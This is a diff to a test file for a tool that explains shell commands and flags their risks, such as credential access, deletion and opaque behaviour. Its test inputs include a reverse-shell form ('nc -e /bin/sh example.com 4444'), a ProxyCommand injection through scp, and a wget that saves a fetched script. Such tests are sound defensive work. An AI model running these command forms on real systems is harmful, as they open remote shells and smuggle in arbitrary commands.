@@ -342,6 +342,20 @@ describe('flags that reach past what the row describes', () => {
     expect(roles('pgrep -u root sshd')).toEqual(['root:user', 'sshd:pattern'])
   })
 
+  it('reads the copying and fetching tools by what they reach', () => {
+    expect(explain('scp -i key.pem notes.txt deploy@bastion:/srv/').facts.touchesCredentials).toBe(true)
+    expect(explain('scp -o ProxyCommand=evil a b:').facts.opaque).toBe(true)
+    expect(effectsOf(explain('rsync -a --delete src/ backup:/srv/').facts)).toContain('delete')
+    expect(explain('rsync -e ssh a b:').facts.opaque).toBe(true)
+    expect(explain('wget -O /tmp/x.sh https://get.example.com').sentence).toBe(
+      'Makes a request to get.example.com and saves what comes back into /tmp/x.sh.',
+    )
+    expect(explain('wget --save-cookies c.txt https://example.com').facts.touchesCredentials).toBe(true)
+    expect(roles('nc -l 8080')).toEqual(['8080:text'])
+    expect(explain('nc -e /bin/sh example.com 4444').facts.opaque).toBe(true)
+    expect(explain('ssh-keygen -R github.com').facts.reversible).toBe('no')
+  })
+
   it('reads a curl settings file as able to send and save', () => {
     const got = explain('curl -K ./opts https://example.com')
     expect(effectsOf(got.facts)).toEqual(expect.arrayContaining(['transmit', 'write', 'create']))
